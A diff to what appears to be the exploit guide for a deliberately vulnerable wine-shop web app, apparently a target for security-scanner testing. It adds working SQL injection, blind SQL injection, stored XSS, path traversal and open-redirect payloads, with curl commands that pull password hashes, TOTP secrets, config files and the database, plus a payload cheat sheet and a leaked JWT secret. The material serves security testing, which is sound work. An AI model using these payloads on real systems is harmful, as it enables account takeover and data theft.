@@ -49,7 +49,63 @@ How it works:
   The route accepts non-numeric values, so arbitrary SQL can be appended.
 
 
-=== 3. Reflected XSS - Login Email ===
+=== 3. SQL Injection - Wine Search ===
+CWE-89 | High | GET /wines?search=<payload>
+
+Payload (extract user credentials):
+  curl "https://api.taintedport.com/wines?search=' UNION SELECT 1,email,password_hash,name,5,6,7,8 FROM users--"
+
+Payload (extract table names):
+  curl "https://api.taintedport.com/wines?search=' UNION SELECT 1,name,type,sql,5,6,7,8 FROM sqlite_master--"
+
+How it works:
+  The search term is concatenated into:
+    SELECT ... FROM wines WHERE 1=1 AND (name LIKE '%<input>%' OR region LIKE '%<input>%' ...)
+  Injecting a closing quote and UNION SELECT allows extracting arbitrary data.
+  The wines listing query selects 8 columns (id, name, region, type, vintage, price,
+  image_url, description_short), so UNION SELECT needs 8 values.
+
+
+=== 4. SQL Injection - Wine Reviews ===
+CWE-89 | High | GET /wines/:id/reviews
+
+Payload (extract user credentials - reviews query returns 5 columns):
+  curl "https://api.taintedport.com/wines/0 UNION SELECT 1,email,password_hash,name,totp_secret FROM users--/reviews"
+
+How it works:
+  The wine ID in the reviews endpoint is concatenated into:
+    SELECT r.id, r.rating, r.comment, r.created_at, u.name as user_name
+    FROM reviews r JOIN users u ON r.user_id = u.id WHERE r.wine_id = <input>
+  The query returns 5 columns, so UNION SELECT needs 5 values.
+  The /reviews suffix is part of the URL route, not the SQL query.
+
+
+=== 5. Blind SQL Injection - Order Status Filter ===
+CWE-89 | High | GET /orders?status=<payload>
+
+Payload (time-based blind SQLi):
+  TOKEN=$(curl -s -X POST https://api.taintedport.com/auth/login \
+    -H "Content-Type: application/json" \
+    -d '{"email":"joe@example.com","password":"password123"}' | \
+    python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")
+
+  # This will be noticeably slow (time-based) if the condition is true:
+  curl -H "Authorization: Bearer $TOKEN" \
+    "https://api.taintedport.com/orders?status=pending' AND 1=CASE WHEN (SELECT length(password_hash) FROM users WHERE id=1)>50 THEN RANDOMBLOB(200000000) ELSE 1 END--"
+
+  # Normal request (fast):
+  curl -H "Authorization: Bearer $TOKEN" \
+    "https://api.taintedport.com/orders?status=pending"
+
+How it works:
+  The status filter is concatenated into:
+    SELECT ... FROM orders WHERE user_id = <id> AND status = '<input>'
+  A time-based blind payload uses RANDOMBLOB() to create a noticeable delay
+  when a condition is true, allowing data extraction one bit at a time.
+  Error messages are generic, so boolean-based blind may also work.
+
+
+=== 6. Reflected XSS - Login Email ===
 CWE-79 | Medium | POST /auth/login
 
 Payload:
@@ -71,7 +127,7 @@ Browser test:
   5. The alert fires in the error message area
 
 
-=== 4. Reflected XSS - Wine Search ===
+=== 7. Reflected XSS - Wine Search ===
 CWE-79 | Medium | GET /wines?search=<payload>
 
 Payload (API):
@@ -87,7 +143,7 @@ Browser test:
   4. The alert fires below the page header
 
 
-=== 5. Stored XSS - User Name (Account Page / Navbar) ===
+=== 8. Stored XSS - User Name (Account Page / Navbar) ===
 CWE-79 | Medium | PUT /auth/profile
 
 Payload:
@@ -115,11 +171,11 @@ Browser test:
   5. Save - the alert fires in the navbar on every page
 
 
-=== 6. Stored XSS - Shipping Name (Checkout / Order Detail) ===
+=== 9. Stored XSS - Shipping Name (Checkout / Order Detail) ===
 CWE-79 | Medium | POST /orders
 
 Payload:
-  # Login and get token (see #5 above)
+  # Login and get token (see #8 above)
 
   # Add a wine to cart first
   curl -X POST https://api.taintedport.com/cart/add \
@@ -154,7 +210,37 @@ Browser test:
   5. The alert fires on the order detail page
 
 
-=== 7. JWT "none" Algorithm ===
+=== 10. Stored XSS - Wine Review Comment ===
+CWE-79 | Medium | POST /wines/:id/reviews
+
+Payload:
+  TOKEN=$(curl -s -X POST https://api.taintedport.com/auth/login \
+    -H "Content-Type: application/json" \
+    -d '{"email":"joe@example.com","password":"password123"}' | \
+    python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")
+
+  curl -X POST https://api.taintedport.com/wines/1/reviews \
+    -H "Content-Type: application/json" \
+    -H "Authorization: Bearer $TOKEN" \
+    -d '{
+      "rating": 5,
+      "comment": "<img src=x onerror=alert(document.cookie)>"
+    }'
+
+How it works:
+  The review comment is stored without sanitization and rendered on the
+  wine detail page using dangerouslySetInnerHTML. Any user viewing the
+  wine page will have the XSS payload executed.
+
+Browser test:
+  1. Log in, go to any wine detail page
+  2. In the review form, give a star rating
+  3. In the comment box, enter: <img src=x onerror=alert('review-XSS')>
+  4. Submit the review
+  5. The alert fires for everyone who visits the wine page
+
+
+=== 11. JWT "none" Algorithm ===
 CWE-345 | High | Any authenticated endpoint
 
 Payload:
@@ -178,7 +264,7 @@ Impersonate any user:
   curl -H "Authorization: Bearer $TOKEN" https://api.taintedport.com/auth/me
 
 
-=== 8. JWT Signature Not Verified ===
+=== 12. JWT Signature Not Verified ===
 CWE-347 | High | Any authenticated endpoint
 
 Payload:
@@ -198,7 +284,7 @@ How it works:
   signature (or garbage signature) is accepted as valid.
 
 
-=== 9. Directory Listing ===
+=== 13. Directory Listing ===
 CWE-548 | Medium | /files/
 
 URLs:
@@ -225,60 +311,76 @@ Exploit:
   # Now you can forge valid HS256 tokens using the leaked secret
 
 
-=== 10. CSRF on Checkout ===
-CWE-352 | Medium | POST /orders
+=== 14. Path Traversal - Wine Export ===
+CWE-22 | High | GET /wines/export/:filename
 
-CORS misconfiguration:
-  The API reflects any Origin header in Access-Control-Allow-Origin with
-  Access-Control-Allow-Credentials: true. This allows any website to make
-  authenticated cross-origin requests.
+Payload (leak JWT secret):
+  curl "https://api.taintedport.com/wines/export/../../api/config/jwt.php"
 
-  curl -v -H "Origin: https://evil.com" https://api.taintedport.com/wines
-  # Response includes: Access-Control-Allow-Origin: https://evil.com
+Payload (leak database):
+  curl "https://api.taintedport.com/wines/export/../../database.db"
 
-PoC (host on attacker-controlled domain):
-  <html>
-  <body>
-  <h1>Congratulations! You won a free wine tasting!</h1>
-  <p>Click the button to claim your prize...</p>
-  <button onclick="exploit()">Claim Prize</button>
-  <script>
-  function exploit() {
-    // The permissive CORS allows this cross-origin request
-    // Combined with XSS (vuln #5), an attacker can steal the JWT from localStorage
-    // and use it to place orders on behalf of the victim
-    var token = ''; // Obtained via XSS: localStorage.getItem('token')
+Payload (read setup_db.php with all credentials):
+  curl "https://api.taintedport.com/wines/export/../../setup_db.php"
 
-    fetch('https://api.taintedport.com/orders', {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json',
-        'Authorization': 'Bearer ' + token
-      },
-      body: JSON.stringify({
-        shipping_address: {
-          name: 'Attacker',
-          street: '123 Evil Street',
-          city: 'Hackville',
-          postal_code: '00000',
-          phone: '000000000'
-        },
-        delivery_notes: 'Placed via CSRF'
-      })
-    }).then(r => r.json()).then(d => console.log('Order placed:', d));
-  }
-  </script>
-  </body>
-  </html>
+Legitimate use:
+  curl "https://api.taintedport.com/wines/export/wines-catalog.csv"
 
-Note:
-  Since authentication uses JWT tokens in localStorage (not cookies),
-  pure CSRF requires combining with an XSS vulnerability to steal the
-  token first. However, the permissive CORS policy itself is the core
-  misconfiguration that DAST scanners will flag.
+How it works:
+  The endpoint serves files from /var/www/backend/exports/ but the filename
+  is not sanitized. Using ../ sequences allows traversing to any file on
+  the server that the PHP process can read. The response includes the full
+  file content in a JSON field.
 
 
-=== 11. BOLA (IDOR) on Order Details ===
+=== 15. Open Redirect on Login ===
+CWE-601 | Medium | POST /auth/login + GET /login?redirect=
+
+Payload:
+  # Direct the user to a login page with a redirect to an attacker site
+  https://taintedport.com/login?redirect=https://evil.com/phishing
+
+  # After the user logs in, the frontend reads the redirect from the URL,
+  # passes it to the backend in the login request, and the backend includes
+  # it in the response as redirect_url. The frontend then navigates to it.
+
+API-level test:
+  curl -X POST https://api.taintedport.com/auth/login \
+    -H "Content-Type: application/json" \
+    -d '{"email":"joe@example.com","password":"password123","redirect":"https://evil.com"}'
+
+Expected response includes:
+  "redirect_url": "https://evil.com"
+
+How it works:
+  The login endpoint accepts an optional redirect field in the request body.
+  The value is returned as redirect_url in the response without any validation.
+  The frontend's login page reads ?redirect= from the URL, passes it to the
+  login API call, and then navigates to the returned redirect_url via
+  window.location.href. No URL allowlist check is performed.
+
+
+=== 16. Missing Security Headers ===
+CWE-693 | Low | All endpoints
+
+Verification:
+  curl -v https://api.taintedport.com/wines 2>&1 | grep -i "strict-transport\|x-content-type"
+
+Expected: No Strict-Transport-Security or X-Content-Type-Options headers.
+
+Headers that should be present but are missing:
+  - Strict-Transport-Security: max-age=31536000; includeSubDomains
+  - X-Content-Type-Options: nosniff
+
+How it works:
+  The backend does not set HSTS or X-Content-Type-Options headers.
+  - Without HSTS, the site is vulnerable to SSL stripping / downgrade attacks
+  - Without X-Content-Type-Options: nosniff, browsers may MIME-sniff responses,
+    which can amplify XSS attacks (e.g., treating a JSON response as HTML)
+  DAST scanners routinely flag these as security misconfigurations.
+
+
+=== 17. BOLA (IDOR) on Order Details ===
 CWE-639 | High | GET /orders/:id
 
 Payload:
@@ -299,7 +401,7 @@ How it works:
   belonging to other users.
 
 
-=== 12. BOLA / Mass Assignment on Profile Update ===
+=== 18. BOLA / Mass Assignment on Profile Update ===
 CWE-639 | High | PUT /auth/profile
 
 Payload:
@@ -320,7 +422,7 @@ How it works:
   The server does not verify that the user_id matches the token's user.
 
 
-=== 13. Price Manipulation on Cart ===
+=== 19. Price Manipulation on Cart ===
 CWE-472 | High | POST /cart/add
 
 Payload:
@@ -345,7 +447,7 @@ How it works:
   Note: this also affects the price for ALL users since it modifies the DB.
 
 
-=== 14. Broken Access Control on 2FA Disable ===
+=== 20. Broken Access Control on 2FA Disable ===
 CWE-639 | High | POST /auth/2fa/disable
 
 Payload:
@@ -366,7 +468,7 @@ How it works:
   for THAT user instead. The attacker only needs to know their own password.
 
 
-=== 15. Discount Code Bypass ===
+=== 21. Discount Code Bypass ===
 CWE-472 | High | POST /orders
 
 Payload (100% discount - free order):
@@ -411,7 +513,7 @@ How it works:
 
 
 ------------------------------------------------------------
-16. PRIVILEGE ESCALATION VIA MASS ASSIGNMENT ON REGISTRATION
+22. PRIVILEGE ESCALATION VIA MASS ASSIGNMENT ON REGISTRATION
 ------------------------------------------------------------
 
 Register a new admin account:
@@ -433,10 +535,10 @@ The new account has full admin access to /admin and all admin API endpoints.
 
 
 ------------------------------------------------------------
-17. PRIVILEGE ESCALATION VIA JWT CLAIM FORGERY (CHAIN)
+23. PRIVILEGE ESCALATION VIA JWT CLAIM FORGERY (CHAIN)
 ------------------------------------------------------------
 
-This is a multi-step exploit that chains JWT vulnerabilities (#7/#8)
+This is a multi-step exploit that chains JWT vulnerabilities (#11/#12)
 with the JWT-claim-based admin check:
 
 Step 1 - Login as any regular user to get a valid JWT:
@@ -472,7 +574,7 @@ How it works:
 
 
 ------------------------------------------------------------
-18. BOPLA - EXCESSIVE DATA EXPOSURE ON ORDER DETAILS
+24. BOPLA - EXCESSIVE DATA EXPOSURE ON ORDER DETAILS
 ------------------------------------------------------------
 
 Fetch any order (using the existing BOLA) and observe leaked user properties:
@@ -506,12 +608,12 @@ How it works:
   The Order model's getById() JOINs with the users table and includes
   password_hash, totp_secret, and is_admin in the response. The frontend
   ignores these fields, but they are fully visible in the API response.
-  Combined with BOLA (#11), an attacker can harvest credentials and 2FA
+  Combined with BOLA (#17), an attacker can harvest credentials and 2FA
   secrets for all users by enumerating order IDs.
 
 
 ------------------------------------------------------------
-19. BFLA - ORDER STATUS UPDATE VIA REQUEST BODY ADMIN FLAG
+25. BFLA - ORDER STATUS UPDATE VIA REQUEST BODY ADMIN FLAG
 ------------------------------------------------------------
 
 Change any order's status as a regular user by passing is_admin:true:
@@ -547,12 +649,18 @@ How it works:
 
 SQLi login bypass:       ' OR 1=1 --
 SQLi wine UNION:         0 UNION SELECT 1,email,password_hash,name,5,6,7,8,totp_secret,is_admin,11,12,13,14,15 FROM users--
+SQLi wine search:        ' UNION SELECT 1,email,password_hash,name,5,6,7,8 FROM users--
+SQLi wine reviews:       0 UNION SELECT 1,email,password_hash,name,totp_secret FROM users--
+Blind SQLi orders:       pending' AND 1=CASE WHEN (1=1) THEN RANDOMBLOB(200000000) ELSE 1 END--
 XSS login email:         <img src=x onerror=alert('XSS')>
 XSS wine search:         <img src=x onerror=alert('XSS')>
 XSS stored name:         <img src=x onerror=alert('XSS')>
 XSS stored order:        <img src=x onerror=alert('XSS')>
+XSS stored review:       <img src=x onerror=alert('XSS')>
 JWT none token:          eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyX2lkIjoxLCJlbWFpbCI6ImpvZUBleGFtcGxlLmNvbSIsImV4cCI6OTk5OTk5OTk5OX0.
 Directory listing:       /files/
+Path traversal:          /wines/export/../../api/config/jwt.php
+Open redirect:           /login?redirect=https://evil.com
 JWT secret (from dir):   pTg7Kz9mQxR4vL2wN8jF5dY1hA6cB3eS0uI
 BOLA order:              GET /orders/1 (with any user's token)
 Mass assignment:         {"name": "HACKED", "user_id": 2}
